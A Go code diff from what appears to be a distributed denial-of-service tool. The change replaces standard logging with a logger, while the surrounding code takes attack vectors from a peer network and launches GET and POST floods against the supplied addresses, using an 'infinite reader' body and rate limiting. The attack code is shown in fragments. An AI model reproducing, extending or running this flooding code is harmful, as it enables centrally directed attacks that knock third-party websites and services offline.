@@ -4,7 +4,6 @@ import (
 	"encoding/json"
 	"fmt"
 	"gra/m/v2/internal"
-	"log"
 	"net/http"
 	"time"
 
@@ -18,7 +17,7 @@ func consumeAttackVectors(peer *roletalk.Peer, ch chan<- internal.AttackVector) 
 
 		err := json.Unmarshal(im.OriginData().Data, &av)
 		if err != nil {
-			log.Fatalln("Cannot unmarshal attack vector. Probably, you use an incompatible versions of this package. Try to upgrade. Thank you!")
+			logger.Fatal("Cannot unmarshal attack vector. Probably, you use an incompatible versions of this package. Try to upgrade. Thank you!")
 		}
 
 		ch <- av
@@ -54,7 +53,7 @@ func attack(av internal.AttackVector) {
 	case "post":
 		go runPostAttack(av.Address)
 	default:
-		log.Fatalln("Unknown attack method. Probably this package is outdated. Please, update to proceed")
+		logger.Fatal("Unknown attack method. Probably this package is outdated. Please, update to proceed")
 	}
 }
 
@@ -84,11 +83,11 @@ func runTargetAttacker(av internal.AttackVector, globalRateLimiter chan<- interf
 }
 
 func runGetAttack(address string) {
-	log.Println(`Running GET`, address)
+	logger.Info(`Running GET`, address)
 
 	_, error := internal.MakeUserRequest(address)
 	if error != nil {
-		log.Println("Got error when doing a request:", error.Error())
+		logger.Warn("Got error when doing a request:", error.Error())
 		return
 	}
 }
@@ -105,7 +104,7 @@ func makeInfiniteReader() infiniteReader {
 }
 
 func runPostAttack(address string) error {
-	log.Println(`Running POST`, address)
+	logger.Info(`Running POST`, address)
 
 	var req *http.Request
 	var res *http.Response
@@ -121,9 +120,9 @@ func runPostAttack(address string) error {
 
 	res, err = http.DefaultClient.Do(req)
 	if err != nil {
-		log.Println(err)
+		logger.Info(err)
 	} else {
-		log.Println("Got POST response:", res.Status, res.Body)
+		logger.Info("Got POST response:", res.Status, res.Body)
 	}
 
 	return nil
